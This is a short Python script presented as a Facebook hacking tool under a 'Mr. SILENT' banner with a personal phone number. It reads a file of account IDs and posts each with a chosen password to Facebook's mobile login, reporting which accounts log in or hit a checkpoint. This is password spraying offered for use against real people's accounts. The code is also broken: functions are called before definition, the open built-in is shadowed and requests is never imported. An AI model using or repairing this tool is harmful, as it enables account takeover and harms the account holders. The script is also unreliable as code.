import os
import sys
import time
from termcolor import colored

a = "\033[031m"

os.system('clear')
print ("======================================")
print ("AUTHOR : Mr. SILENT")
print ("FACEBOOK: Prince raymond")
print ("GROUP TEAM   : Mr.SILENT")
print ("***SILENT_HACKER***")
print ("======================================")
print
print ("================   ================")
print ("# 09502683666          PHILIPPINES")
print ("=============      ================")
time.sleep(2)
print
print ("===============================")
print ("***SILENT_HACKER*** Mr.SILENT")
print ("===============================")
print
print
print ("===========================")
print ("1). Mr.SILENT HACK FACEBOOK")
print ("===========================")
time.sleep(2)
print ("===========================")
print ("2).       EXIT")
print ("===========================")
time.sleep(3)
pilih = str(input('[?] select : '))

if pilih == "1":
        os.system('pkg update && pkg upgrade')
        os.system('pkg install python2')
        os.system('pkg install git')
        os.system('pip2 install requests')
        os.system('pip2 install mechanize')
        os.system('pip install termcolor')

os.system('clear')
print ("█████████")
print ("█▄█████▄█================================")
print ("█▼▼▼▼▼     Author : Mr.SILENT")
print ("█          facebook: Prince raymond")
print ("█▲▲▲▲▲     Team   : Mr.SILENT")
print ("█████████================================")
print ("_██____██")
print
print
id = input("Enter ID list : ")
pw = input("password to  crack : ")


try:
        list(id,pw)

except:
        exit()

def brute(id,pw):
        link = "https://m.facebook.com/login.php"
        data = {"email":id, "pass":pw}
        r = requests.post(link, data=data)
        print (r.url)
        if "m_sess" in r.url:
                print ("found "+ id +" ~>  " + pw)
        elif "checkpoint" in r.url:
                print ("checkpoint "+ id +" ~>  " + pw)
        else:
                print ("failed "+ id )
def list(open,pw):
        file = open(open, "r").readlines()
        for i in file:
                brute(i.strip(),pw)

try:
        list(id,pw)

except:
        exit()
